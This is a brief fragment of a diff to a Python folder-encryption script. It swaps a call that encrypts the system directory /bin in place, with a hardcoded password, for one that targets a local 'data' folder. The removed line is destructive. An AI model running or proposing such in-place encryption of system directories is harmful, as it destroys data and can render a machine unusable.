@@ -29,5 +29,5 @@ def encrypt_folder(folder_path, password):
             with open(file_path, 'wb') as f:
                 f.write(encrypted_data)
 
-encrypt_folder("/bin", "mypassword")
+encrypt_folder("data", "mypassword")
 
